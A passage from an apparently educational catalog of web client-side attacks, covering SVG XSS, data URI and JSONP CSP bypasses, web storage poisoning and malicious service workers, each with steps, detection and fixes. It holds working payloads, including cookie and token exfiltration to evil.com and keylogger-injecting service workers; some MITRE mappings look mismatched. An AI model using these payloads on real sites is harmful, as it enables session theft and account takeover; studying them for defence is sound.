- **Attack Steps**: Step 1: Identify a location where user input is rendered as raw HTML (e.g., comment box, bio, SVG uploader). Step 2: Inject the following SVG payload: <svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>. Step 3: Submit and load the rendered page. Step 4: If the browser shows an alert, it confirms the SVG script executed. Step 5: Test across Chrome, Firefox, Edge — most modern browsers allow script execution in inline SVGs unless CSP blocks it. Step 6: Try more advanced payloads (e.g., cookie theft or redirect). Step 7: Use browser dev tools → Elements tab to verify SVG+script is preserved. Step 8: Recommend blocking inline SVG rendering from user input or parsing SVGs as plain text. Step 9: Enforce CSP: script-src 'self' to block inline SVG JS. Step 10: Retest — scripts inside SVG must be ignored or removed.
- **Detection**: DOM audit for embedded <svg><script>; scan CSP violations
- **Solution**: Sanitize SVG input; disable inline rendering; use SVG sanitizer libraries
- **Tags**: SVG XSS, Inline Script, Vector Image Injection

## SVG Event Handler XSS via <animate onbegin=alert(1)>

- **Attack Type**: Event-Based JS Execution in SVG Elements
- **Target**: Profile pics, HTML areas
- **Vulnerability**: SVG event attributes executed unchecked
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: Silent code execution, cookie leakage
- **Tools**: Browser, SVG Playground, Burp Suite
- **Scenario**: SVG allows JavaScript-like behavior with event attributes. Injecting elements like <animate> with onbegin or onload triggers JS execution silently.
- **Attack Steps**: Step 1: Locate a place where SVG or HTML is rendered based on user input. Step 2: Inject the payload: <svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="x" from="0" to="100" begin="0s" dur="1s" onbegin="alert(1)"/></svg>. Step 3: Submit and load the page. Step 4: If the alert appears immediately, the SVG engine ran the onbegin attribute. Step 5: Try other events like onload, onend, onrepeat, etc. Step 6: Test more harmful payloads like fetch('/steal?c='+document.cookie). Step 7: Recommend removing all inline event handlers from SVGs using a sanitizer like DOMPurify or sanitize-html. Step 8: CSP should also block inline handlers: use unsafe-hashes or nonce with strict rules. Step 9: Retest — page should not execute any JS from SVG events.
- **Detection**: Monitor for <svg> with event attributes like onbegin, onload; CSP reports
- **Solution**: Remove all SVG event handlers; use secure SVG parsers
- **Tags**: SVG Animate XSS, Event Handler Injection, Vector Attack

## JavaScript in Data URIs (<iframe src="data:text/html,...">)

- **Attack Type**: JS Execution via data: URI Injection
- **Target**: Iframe or image src
- **Vulnerability**: Allowing data: URLs with embedded JS
- **MITRE**: T1200 – Trusted Content Abuse
- **Impact**: Hidden XSS, phishing, JS execution via embedded URLs
- **Tools**: Burp Suite, HTML playground
- **Scenario**: Data URIs let attackers embed entire HTML/JS payloads into a single URL. If an app accepts data: in iframe/img, attacker can load and run scripts without needing a remote server.
- **Attack Steps**: Step 1: Look for any place where the app allows embedding custom URLs in <iframe> or image sources. Step 2: Inject: <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>. Step 3: Load and test — if alert appears, the browser executed inline JS from data: URI. Step 4: Try data:text/html;base64,... to encode the HTML and test bypasses. Step 5: Modern CSPs often block data: sources; check if CSP is absent or weak. Step 6: If successful, expand attack with full HTML pages or login page clones. Step 7: Recommend disallowing data: URIs completely via CSP: default-src 'self'; frame-src 'none';. Step 8: Audit iframe usage and sanitize all src attributes. Step 9: Retest — browser must block data: execution in iframe.
- **Detection**: CSP headers should block data:; browser devtools show data: resource usage
- **Solution**: Block data: in src attributes; enforce CSP disallowing data: entirely
- **Tags**: Data URI XSS, Iframe Injection, Inline Code Payloads

## JSONP Endpoint Abuse to Bypass CSP

- **Attack Type**: JSONP Hijack to Load Malicious Script
- **Target**: Public APIs
- **Vulnerability**: JSONP misused to bypass origin policy
- **MITRE**: T1071 – Application Layer Protocol Abuse
- **Impact**: CSP bypass, XSS, remote code execution
- **Tools**: Burp Suite, jsfiddle, requestbin
- **Scenario**: JSONP endpoints return JS code wrapped in callbacks. If attacker controls callback= param, they can inject their own JS and bypass CSP if the domain is whitelisted.
- **Attack Steps**: Step 1: Identify a JSONP endpoint like https://api.site.com/data?callback=handler. Step 2: Test if you can change the callback: ?callback=alert → response is alert({...}). Step 3: Try injecting: ?callback=alert(1)// or ?callback=evil (where evil is a malicious function). Step 4: Host your script on attacker.com. Use <script src="https://api.site.com/data?callback=evil">. Step 5: If the site uses loose CSP like script-src 'self' api.site.com, this script will run. Step 6: Abuse the JSONP response to execute arbitrary code (e.g., steal cookies or perform actions). Step 7: Recommend disabling JSONP support entirely — it’s outdated. Step 8: Use CORS + strict response types (JSON only). Step 9: Retest — callback param must not control JS output.
- **Detection**: Audit script requests to API endpoints with callback param; CSP violation logs
- **Solution**: Remove JSONP; switch to secure CORS with JSON responses only
- **Tags**: JSONP Injection, CSP Bypass, Callback Control

## Inline Script Execution Using CSP Whitelisted Hash/Nonce

- **Attack Type**: CSP Bypass via Known Nonce/Hash Injection
- **Target**: Inline scripts with CSP
- **Vulnerability**: Nonce/hash reuse or predictability in CSP
- **MITRE**: T1203 – Exploit CSP Policy Weakness
- **Impact**: Bypasses intended CSP protection, leads to XSS
- **Tools**: CSP Evaluator, DevTools, Burp Suite
- **Scenario**: CSP policies allow inline script only if they match a hash/nonce. If attacker can guess or reuse a known hash/nonce, they can inject and execute scripts despite CSP.
- **Attack Steps**: Step 1: Analyze the CSP header using DevTools → Network tab → Headers → Content-Security-Policy. Look for: script-src 'nonce-abc123' or sha256-xyz. Step 2: Find any page where the nonce is exposed (e.g., reused across pages, in DOM, or predictable). Step 3: Inject a script like <script nonce="abc123">alert('XSS')</script> where user input is reflected into HTML. Step 4: If alert appears, it confirms nonce/hash injection succeeded. Step 5: Try variations — reused nonces across all users/sessions are weak. Step 6: Also try matching sha256-... if inline scripts are reused (e.g., known analytics snippet). Step 7: Recommend generating per-request random nonces. Never reuse them. Step 8: Block user input from affecting CSP headers or script content. Step 9: Retest — user input with matching nonce/hash must fail to execute.
- **Detection**: Audit CSP headers; detect nonce/hash reuse; scan DOM for injected nonce= attributes
- **Solution**: Use per-request nonces; block input reflection in inline scripts or CSP headers
- **Tags**: CSP Bypass, Inline Script Injection, Hash/Nonce Exploit

## CSP Bypass via script-src: unsafe-inline

- **Attack Type**: CSP Misconfiguration – Inline Script Allowed
- **Target**: HTML pages with CSP
- **Vulnerability**: Misuse of 'unsafe-inline' allows XSS
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: Stored/Reflected XSS, complete CSP bypass
- **Tools**: DevTools, Burp Suite
- **Scenario**: Websites using script-src 'unsafe-inline' in CSP allow all inline <script> blocks to execute, making CSP ineffective and vulnerable to XSS.
- **Attack Steps**: Step 1: Visit a target page and inspect the CSP header in DevTools (F12 → Network → Headers → Content-Security-Policy). Step 2: If you see script-src 'unsafe-inline', this allows ANY inline <script> block to run. Step 3: In any field that reflects user input into HTML (e.g., comments), inject <script>alert(1)</script>. Step 4: Submit and reload the page. If alert fires, the XSS is successful due to CSP misconfiguration. Step 5: Confirm this works even if the site claims to have CSP protections. Step 6: Try other malicious scripts like stealing document.cookie or DOM modification. Step 7: Highlight that 'unsafe-inline' should NEVER be used in secure apps. Step 8: Recommend switching to nonce-based or hash-based CSPs and removing all inline script. Step 9: Retest with inline script — it should now be blocked.
- **Detection**: Review HTTP response headers for 'unsafe-inline'; test inline JS in comments/forms
- **Solution**: Remove 'unsafe-inline'; use CSP with hashes or nonces; refactor to external JS
- **Tags**: CSP Misconfig, Inline Script, JavaScript Injection

## Exploiting Misconfigured CSP with Wildcards (*.example.com)

- **Attack Type**: CSP Whitelist Abuse via Wildcards
- **Target**: Script-loaded HTML pages
- **Vulnerability**: Use of wildcards in script-src enables attacker
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: XSS, session theft, remote JS execution
- **Tools**: Subdomain Takeover Tools, DNS, DevTools
- **Scenario**: Sites that use script-src *.example.com in CSP allow loading malicious JS from attacker-controlled subdomains like evil.example.com.
- **Attack Steps**: Step 1: Check the site’s CSP header using DevTools. Look for policies like script-src *.example.com. Step 2: Register or hijack a subdomain like cdn.example.com, old.example.com, or find an unused one vulnerable to takeover (e.g., via GitHub Pages, Heroku). Step 3: Host a malicious script on the subdomain: evil.example.com/payload.js with document.cookie exfiltration. Step 4: Inject <script src="https://evil.example.com/payload.js"></script> into a field or use a CSRF vector. Step 5: When the page loads, if CSP allows the script, browser executes attacker’s JS. Step 6: Confirm data exfiltration. Step 7: Recommend avoiding wildcards in CSP; use exact subdomains or hashes. Step 8: Retest with wildcard removed — external attacker-controlled JS should no longer execute.
- **Detection**: Analyze CSP and compare with domain DNS data; detect new JS requests from non-production subdomains
- **Solution**: Avoid wildcards in script-src; restrict to specific, trusted domains only
- **Tags**: Wildcard CSP, JS Injection, Subdomain Abuse

## HTML Injection into CSP-Protected Page with unsafe-eval

- **Attack Type**: HTML Injection Enabling eval() Execution
- **Target**: JS-heavy web apps
- **Vulnerability**: CSP allows unsafe-eval, enabling dynamic execution
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: JavaScript RCE, DOM XSS, logic tampering
- **Tools**: Browser Console, CSP Evaluator, Burp Suite
- **Scenario**: Sites using unsafe-eval in CSP allow execution of arbitrary strings via eval(), setTimeout(str), new Function(), etc. — this can allow full XSS even under CSP.
- **Attack Steps**: Step 1: Open browser DevTools and inspect CSP headers. Look for script-src containing 'unsafe-eval'. Step 2: In any input that reflects back in JS context, inject a payload like ");alert(1);//. Step 3: Try breaking out of strings inside inline JS blocks. Step 4: Test if the page uses eval() or setTimeout() with user-controlled data. For example: setTimeout('alert(1)', 1000). Step 5: Inject full payloads: <script>eval('alert(document.domain)')</script>. Step 6: If allowed and alert appears, CSP is bypassed using unsafe-eval. Step 7: Try chaining with fetch() or location.href to escalate. Step 8: Recommend removing unsafe-eval entirely and refactoring JS code to avoid string-based execution. Step 9: Retest — eval() and similar APIs must fail under new CSP.
- **Detection**: Look for string-based JS APIs in combination with unsafe-eval in CSP
- **Solution**: Rewrite JS to avoid eval, new Function; block unsafe-eval in CSP header
- **Tags**: Eval Injection, HTML Injection, CSP Bypass

## Legacy Browsers Ignoring Modern CSP Directives

- **Attack Type**: Browser Compatibility Issue in CSP Enforcement
- **Target**: Legacy browser clients
- **Vulnerability**: Lack of CSP enforcement in older browsers
- **MITRE**: T1087 – Security Feature Bypass
- **Impact**: XSS via unsupported CSP, policy evasion
- **Tools**: BrowserStack, Old Browsers, Burp Suite
- **Scenario**: Older or legacy browsers (e.g., IE11, old Android WebView) do not understand or enforce modern CSP rules, allowing inline JS and XSS even if CSP is present.
- **Attack Steps**: Step 1: Set up test environments using old browsers (e.g., IE11, Android 4.x stock browser). Use BrowserStack, SauceLabs, or VMs. Step 2: Visit a CSP-protected site that blocks inline JS. Step 3: Inject an inline script like <script>alert('XSS')</script> into a comment field. Step 4: In modern browsers, this should be blocked. Step 5: Open the same page in IE11 or Android 4.x — if the script executes, CSP is not enforced. Step 6: Repeat with known CSP rules like script-src 'self' or nonce-*. Legacy browsers may ignore both. Step 7: Confirm by inspecting headers in legacy browser — CSP ignored. Step 8: Recommend server-side rendering or escaping user content to prevent reliance on CSP alone. Step 9: Audit user browser base and alert if CSP bypass is possible. Step 10: Mitigate by avoiding inline JS altogether.
- **Detection**: Test across different browser versions; validate actual CSP behavior per client browser
- **Solution**: Avoid inline scripts; sanitize inputs regardless of CSP; warn/deny access from unsupported legacy browsers
- **Tags**: CSP Legacy, Browser Exploit, Security Policy Bypass

## LocalStorage Poisoning to Override Trusted Data

- **Attack Type**: Data Injection via LocalStorage Manipulation
- **Target**: Frontend apps using storage
- **Vulnerability**: Unvalidated usage of LocalStorage for logic/data
- **MITRE**: T1557.002 – Application Layer Manipulation
- **Impact**: Persistent XSS, logic alteration, stored attack vector
- **Tools**: DevTools > Application tab, JS Console
- **Scenario**: Applications trusting LocalStorage for dynamic content loading or logic may be vulnerable to data poisoning — attacker can inject JS or bypass checks via stored values.
- **Attack Steps**: Step 1: Identify pages using localStorage.getItem() in JS via DevTools → Sources tab or JS code. Step 2: In DevTools → Application tab, edit a key like userRole or template to a malicious value: localStorage.setItem('template','<img src=x onerror=alert(1)>'). Step 3: Reload the page. If the page loads stored content directly without escaping/sanitization, alert will fire. Step 4: Try injecting values used in innerHTML or JS eval(). Step 5: Escalate attack: steal tokens or override app behavior via poisoned storage. Step 6: Apps using frameworks like Angular, React can also be vulnerable if stored values affect props/states. Step 7: Recommend never using LocalStorage for sensitive logic or dynamic rendering unless properly validated. Step 8: Sanitize all data pulled from LocalStorage before rendering. Step 9: Retest after applying validation — scripts should no longer execute.
- **Detection**: Monitor JS code for localStorage usage; use CSP + sanitization for storage-derived data
- **Solution**: Sanitize localStorage reads; use secure APIs; validate all dynamic rendering from client-side storage
- **Tags**: LocalStorage Injection, JS Poisoning, Persistent XSS

## sessionStorage Abuse to Inject Malicious Code

- **Attack Type**: Injection via sessionStorage
- **Target**: SPA apps using sessionStorage
- **Vulnerability**: Rendering HTML from unvalidated sessionStorage
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: DOM-based XSS, session hijacking
- **Tools**: DevTools, Browser Console
- **Scenario**: If an application uses sessionStorage content directly in DOM rendering or script execution without sanitization, attackers can inject malicious code into a page session.
- **Attack Steps**: Step 1: Open the target web page and check the browser DevTools → Application tab → sessionStorage. Step 2: Look for keys used by the app (e.g., userHTML, pageTheme, config, etc.). Step 3: Open the Console tab and inject a value: sessionStorage.setItem('userHTML','<img src=x onerror=alert(1)>'). Step 4: Reload the page or trigger the action that reads from sessionStorage. Step 5: If the page renders your payload (alert box), the app is vulnerable. Step 6: If JS uses innerHTML or document.write with sessionStorage data, you can perform full DOM XSS. Step 7: Try <script> payloads or fetch() to escalate. Step 8: Recommend: Never trust sessionStorage for rendering; sanitize all dynamic HTML. Step 9: Retest — stored data must not be executed or inserted into DOM unsanitized.
- **Detection**: Look for sessionStorage.getItem() + innerHTML; detect DOM injection points
- **Solution**: Sanitize all content pulled from sessionStorage; avoid using it for untrusted dynamic rendering
- **Tags**: sessionStorage Injection, DOM XSS, Persistent Storage Abuse

## Web Storage XSS Persistence Across Tabs

- **Attack Type**: Persistent Client-Side XSS via local/sessionStorage
- **Target**: Web pages sharing storage
- **Vulnerability**: Reuse of unsafe data across tab contexts
- **MITRE**: T1557.002 – Application Layer Manipulation
- **Impact**: Persistent XSS, cross-tab payload execution
- **Tools**: DevTools, Multiple Tabs, Burp Suite
- **Scenario**: Even if a malicious payload is injected in one tab, it can persist and execute in other tabs that share the same storage context, leading to cross-tab exploitation.
- **Attack Steps**: Step 1: Open the target site in Tab A and inject payload in localStorage: localStorage.setItem("msg", "<script>alert('XSS')</script>"). Step 2: In Tab B, open the same site. If it uses localStorage data in DOM, the script executes. Step 3: If the app auto-loads user notes, comments, or settings from storage, this may execute attacker’s code. Step 4: Test across sessionStorage too, which is tab-scoped but used by many SPAs. Step 5: This makes XSS more dangerous — attacker can infect one tab, affecting others silently. Step 6: Recommended mitigation: Sanitize all reads from storage and block script injections from storage-derived input. Step 7: Consider clearing storage on logout or origin change. Step 8: Retest — content should render safely across all tabs.
- **Detection**: Monitor for localStorage.getItem() + innerHTML across tabs
- **Solution**: Sanitize values before rendering; do not store raw HTML/JS in local/sessionStorage
- **Tags**: Cross-Tab Storage XSS, Persistent DOM Injection

## WebSQL Injection (Deprecated but still exploitable)

- **Attack Type**: SQL Injection via WebSQL API
- **Target**: Legacy apps using WebSQL
- **Vulnerability**: Input concatenated into SQL queries in WebSQL
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data leakage, client-side logic exposure
- **Tools**: Chrome DevTools, JS Console
- **Scenario**: Though deprecated, WebSQL is still used in legacy browsers and apps. If user input is concatenated into SQL queries directly, attackers can inject SQL statements.
- **Attack Steps**: Step 1: Open the DevTools → Console tab. Step 2: Find code using WebSQL: openDatabase(), transaction(), executeSql(). Step 3: Inject SQL code via app input or directly via DevTools like: db.transaction(function(tx){tx.executeSql("SELECT * FROM users WHERE name = '"+user+"'",[],function(){},function(e){console.log(e)})}). Step 4: If input is not parameterized, inject ' OR '1'='1 to return all users. Step 5: Try DROP TABLE or UNION SELECT if possible. Step 6: Exploitation is limited to client-side impact but can reveal app logic or leak client-side data. Step 7: Recommend refactoring legacy code to IndexedDB or other secure storage APIs. Step 8: Use prepared statements and strict input validation.
- **Detection**: DevTools: look for insecure executeSql() calls with input concatenation
- **Solution**: Avoid WebSQL entirely; migrate to IndexedDB or LocalStorage with validation
- **Tags**: WebSQL Injection, Legacy API Exploit

## Abuse of IndexedDB for Persistence or Data Extraction

- **Attack Type**: Storage Abuse via IndexedDB
- **Target**: Modern SPAs or offline apps
- **Vulnerability**: Unvalidated use of IndexedDB data
- **MITRE**: T1557 – Application Layer Abuse
- **Impact**: Persistent XSS, session backdoor, stealth data injection
- **Tools**: DevTools → Application → IndexedDB
- **Scenario**: IndexedDB allows structured data storage. If attackers can inject malicious data into it (via XSS or vulnerable API), they can persist data across sessions or extract sensitive info.
- **Attack Steps**: Step 1: Open the Application tab in DevTools → IndexedDB section. Step 2: Observe existing object stores (e.g., userProfile, settings, drafts). Step 3: In Console, inject: let db = indexedDB.open("userDB"); db.onsuccess = () => { let tx = db.result.transaction("settings", "readwrite"); tx.objectStore("settings").put("<img src=x onerror=alert(1)>", "homepage"); }. Step 4: Reload the page — if app reads this value into DOM, script executes. Step 5: This bypasses basic XSS filters because IndexedDB is rarely validated. Step 6: Use it to persist backdoors, tamper with data, or extract tokens. Step 7: Mitigation: Sanitize everything read from IndexedDB and implement access controls. Step 8: Retest — malicious entries should not trigger actions or scripts.
- **Detection**: DevTools > IndexedDB monitoring; audit dynamic usage in frontend frameworks
- **Solution**: Sanitize read/write IndexedDB operations; never render data directly into DOM from it
- **Tags**: IndexedDB Abuse, Persistence, Local Injection

## Stealing Tokens Stored in Storage via XSS

- **Attack Type**: Token Theft via Storage + XSS
- **Target**: Any JS-based app
- **Vulnerability**: Tokens stored insecurely in accessible storage
- **MITRE**: T1557.002 – Application Layer Manipulation
- **Impact**: Account takeover, session hijack
- **Tools**: Burp Suite, JS Console, DevTools
- **Scenario**: Access tokens, API keys, or JWTs stored in localStorage or sessionStorage can be stolen via DOM XSS attacks. These tokens are often exposed and easy to extract using injected scripts.
- **Attack Steps**: Step 1: Find or inject an XSS vulnerability (e.g., via comment, profile input). Step 2: Inject payload: <script>fetch('https://evil.com?token='+localStorage.getItem('authToken'))</script>. Step 3: If the site executes this script, attacker receives the token in their server logs. Step 4: Try variants: sessionStorage.getItem(), document.cookie, or IndexedDB.get(). Step 5: Combine with iframe or beacon for stealth. Step 6: Now use stolen token to make authenticated API calls or impersonate the victim. Step 7: Mitigation: Never store sensitive tokens in localStorage/sessionStorage. Prefer HTTP-only secure cookies. Step 8: Retest — if token exists only in cookie with HttpOnly flag, script cannot access it.
- **Detection**: Monitor outbound traffic and logs; audit usage of storage APIs for sensitive info
- **Solution**: Use HTTP-only secure cookies for auth; clear tokens on logout; block storage access from untrusted contexts
- **Tags**: Token Theft, XSS + Storage, API Abuse

## Exploiting Service Workers for Persistent XSS or Cache Poisoning

- **Attack Type**: Client-Side Persistent XSS via Service Workers
- **Target**: Progressive Web Apps (PWAs)
- **Vulnerability**: Unscoped service worker and insecure cache control
- **MITRE**: T1557.002 – Application Layer Protocol Abuse
- **Impact**: Persistent XSS, content tampering, cache poisoning
- **Tools**: Chrome DevTools, Burp Suite, Custom Service Worker
- **Scenario**: Attackers exploit poorly secured service workers to inject malicious scripts into cached pages, leading to persistent XSS or long-term content manipulation on victim browsers.
- **Attack Steps**: Step 1: First, attacker finds a site that registers a Service Worker (SW) and doesn't verify or sanitize the scripts it caches (common in PWAs or offline-ready apps). Step 2: Visit the site and check DevTools → Application → Service Workers to verify it is using one. Step 3: If the SW script is hosted on a predictable or insecure endpoint (e.g., /sw.js, /service-worker.js) and accessible without CSP or signature validation, attacker targets this. Step 4: Now, attacker finds an XSS or an injection point (like a comment box, profile editor, etc.). Step 5: Attacker injects a payload like <script>navigator.serviceWorker.register('/evil-sw.js')</script>. This registers a malicious service worker. Step 6: If the app doesn’t scope or protect service worker registration, this malicious SW gains control. Step 7: Inside evil-sw.js, the attacker writes a fetch handler that modifies cached HTML content and injects <script src='https://evil.com/steal.js'></script> into every HTML response. Step 8: Once registered, the malicious SW persists even after the tab is closed — it can intercept and rewrite all future page loads in scope. Step 9: Victim returns to the site later → malicious cached responses still trigger the XSS (persistent XSS). Step 10: For cache poisoning: SW can serve outdated/malicious versions of scripts (e.g., jQuery). Step 11: The attacker can serve an old vulnerable version of main.js with a keylogger or exfiltrator code. Step 12: Defender should verify Service-Worker-Allowed headers, ensure strict CSP, and never cache HTML or register SWs based on user input. Step 13: Developer must scope SW properly and regularly purge/verify service worker cache and scripts.
- **Detection**: Monitor SW registration URLs; scan cached responses; audit all fetch and install events in registered SWs
- **Solution**: Use strict CSP (disallow script injection); restrict scope and script path of service workers; never trust user-generated paths
- **Tags**: Service Worker Exploit, Persistent XSS, Cache Poisoning, PWA Security

## Overwriting Offline Cache via Malicious Service Worker

- **Attack Type**: PWA Offline Cache Poisoning via Service Worker Injection
- **Target**: Progressive Web Apps (PWAs)
- **Vulnerability**: Untrusted/malicious cache injection via SW
- **MITRE**: T1557.002 – Application Layer Protocol Abuse
- **Impact**: Fake offline login, data theft, persistent XSS
- **Tools**: Chrome DevTools, Burp Suite, Netlify, GitHub Pages
- **Scenario**: Attackers exploit weak service worker registration or cache logic to overwrite offline content with malicious scripts or phishing pages, which persist across sessions and reloads.
- **Attack Steps**: Step 1: Attacker finds a PWA or offline-ready web app that registers a service worker and uses cache storage to store HTML/JS content for offline support. Step 2: Attacker identifies a way to register a malicious service worker (e.g., via existing XSS, misconfigured routes, or exposed endpoints like /register-sw.js). Step 3: Attacker hosts a malicious service worker file (evil-sw.js) on their server that intercepts fetch events and rewrites cached responses: event.respondWith(new Response('<h1>Hacked Offline Page</h1><script src="https://evil.com/keylog.js"></script>')). Step 4: Via XSS or open redirect, attacker tricks the victim into loading and registering the attacker’s SW. Step 5: The malicious SW now intercepts page loads (even offline) and serves cached malicious content. Step 6: When the user disconnects from the internet, the poisoned cache displays fake pages with keyloggers or phishing forms. Step 7: Attacker ensures persistence by caching HTML, JS, or login pages in the SW install() lifecycle hook. Step 8: Victim sees these fake pages while offline — believing them to be legitimate. Step 9: Defender should never cache HTML in SWs without integrity checks, and must verify service worker scope and origin. Step 10: Use Subresource Integrity (SRI), avoid caching sensitive routes, and implement SW security headers.
- **Detection**: Monitor cached responses; scan SW scripts; review CacheStorage entries via DevTools
- **Solution**: Restrict SW scope, use CSP + SRI, validate all cached resources, block HTML caching unless strictly verified
- **Tags**: Service Worker Exploit, Cache Poisoning, PWA Attack

## Hijacking App Logic by Modifying Stored Config in LocalStorage

- **Attack Type**: Client-Side Logic Tampering via LocalStorage Overwrite
- **Target**: JS Web Apps or SPAs
- **Vulnerability**: Trusting client-controlled storage for sensitive logic
- **MITRE**: T1557 – Application Layer Manipulation
- **Impact**: Role escalation, logic bypass, data manipulation
- **Tools**: DevTools → Application → localStorage
- **Scenario**: Applications storing runtime config in localStorage (e.g., feature toggles, themes, user roles) can be manipulated to alter behavior, escalate access, or bypass protections.
- **Attack Steps**: Step 1: Open target app and go to DevTools (F12) → Application tab → localStorage section. Step 2: Look for keys like userRole, appMode, canEdit, or accessLevel. Step 3: If any of these affect application logic (e.g., admin UI toggle), they’re potential targets. Step 4: In DevTools Console, inject: localStorage.setItem("userRole", "admin") or modify canEdit to true. Step 5: Reload the app — if UI changes (admin panel appears, edit button enables), the app is trusting localStorage blindly. Step 6: Now test further abuse: toggle isPremium to true, or switch apiBaseUrl to a malicious server (https://evil.com/api). Step 7: If logic is hijacked or remote calls are redirected, the app is vulnerable. Step 8: Try extracting tokens or overriding logic like discount calculation. Step 9: Mitigation: Never use localStorage for logic enforcement. Instead, fetch server-side verified roles on every request. Step 10: Defenders must implement logic validation server-side and audit localStorage-dependent code.
- **Detection**: Review storage usage; track logic shift based on localStorage; monitor unexpected role/UI behavior
- **Solution**: Use server-side verification; treat localStorage as untrusted; encrypt/verify if used for state
- **Tags**: LocalStorage Tampering, Role Escalation, Logic Injection

